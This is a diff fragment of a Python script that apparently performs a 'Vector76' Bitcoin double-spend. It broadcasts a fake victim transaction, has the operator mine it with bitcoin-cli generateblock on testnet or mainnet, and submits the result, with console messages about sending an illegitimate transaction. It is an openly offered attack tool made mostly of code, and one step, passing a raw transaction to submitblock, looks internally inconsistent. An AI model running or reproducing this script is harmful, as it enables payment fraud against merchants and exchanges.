@@ -118,28 +118,27 @@ print()
 print()
 print("[+] READY...")
 print()
+
 input(" --- Press enter after submitting the fake transaction rawtx.... --- ")
 print()
 print("OK")
-print("Mining fake tx block...")
+print("Send fake TX...")
 
-vector76_response = None
+broadcast_transaction(tx_victim, testnet)
 if testnet:
-    vector76_response = rpc_node.call("generateblock", fake_from.address.testnet.pubaddr1, f"['{tx_victim}']")
+    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.testnet.pubaddr1} '[\"{tx_victim}\"]' false")
 else:
-    vector76_response = rpc_node.call("generateblock", fake_from.address.mainnet.pubaddr1, f"['{tx_victim}']")
-
-print(vector76_response)
-input("--- Send the block after pressing the enter key. --- ")
+    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.mainnet.pubaddr1} '[\"{tx_victim}\"]' false")
+print()
 print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
 print()
 result = rpc_node.submitblock(tx_victim)
 print()
+broadcast_transaction(tx_victim, testnet)
 print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
 print(result)
 print()
 #ゴリ押し
-result = rpc_node.submitblock(vector76_response)  #ゴリ押し
 print()
 #おまけ
 print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
